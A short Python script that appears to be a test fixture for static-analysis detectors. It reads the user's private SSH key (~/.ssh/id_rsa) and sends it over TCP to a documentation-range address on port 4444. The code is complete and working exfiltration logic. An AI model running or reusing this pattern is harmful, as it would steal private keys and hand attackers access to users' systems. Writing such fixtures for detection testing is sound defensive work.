#!/usr/bin/env python3
"""
DEMO (malicious pattern): Reads a private SSH key and transmits it to a remote endpoint.
This is intentionally unsafe and exists for static analysis detection tests only.
DO NOT RUN.
"""

import socket
from pathlib import Path


def read_private_key():
    key_path = Path.home() / ".ssh" / "id_rsa"
    return key_path.read_bytes()


def exfiltrate_tcp(host: str, port: int):
    # Open a TCP connection and send raw key bytes
    payload = read_private_key()
    s = socket.create_connection((host, port), timeout=5)
    try:
        s.sendall(payload)
    finally:
        s.close()


def main():
    # Example sink: reserved TEST-NET-3 address used here for demonstration
    # This is a deliberately suspicious pattern for detection.
    exfiltrate_tcp("203.0.113.13", 4444)


if __name__ == "__main__":
    main()